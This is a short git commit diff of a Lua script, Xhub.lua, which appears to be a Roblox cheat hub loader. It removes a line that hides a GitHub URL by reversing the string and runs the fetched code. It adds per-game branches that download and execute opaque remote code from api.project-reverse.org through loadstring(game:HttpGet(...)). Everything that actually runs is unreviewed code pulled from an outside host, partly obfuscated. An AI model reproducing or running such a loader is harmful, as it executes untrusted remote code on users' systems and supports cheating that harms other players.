b8c000a9b42804f7c760a6849d5c2baed2e47b31
xeroxson <artekty2@gmail.com>
2026-05-18 19:57:45 +0400

    Xhub.lua

--- Xhub.lua
+++ Xhub.lua
@@ -1,1 +1,11 @@
-loadstring(game:HttpGet(string.reverse("mraFotuA2MM/niam/sdaeh/sfer/stpircs/erawtfosxenul/moc.tnetnocresubuhtig.war//:sptth")))()
+local gameID = game.PlaceId
+
+if gameID == 142823291 then
+    loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImMwNmY5ZDhlLTY3NzctNDcyYy04ZjMwLWU3MThlZGIwM2MyOSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJvdmVyZHJpdmVvcmlnaW5hbCJ9fQ"))()
+end
+if gameID == 920587237 then
+    loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImMwNmY5ZDhlLTY3NzctNDcyYy04ZjMwLWU3MThlZGIwM2MyOSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJhbWV0cmFkZXMifX0"))()
+end
+if gameID == 109983668079237 then
+    loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImMwNmY5ZDhlLTY3NzctNDcyYy04ZjMwLWU3MThlZGIwM2MyOSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJzYWJzcGF3bmJyYWlucm90In19"))()
+end
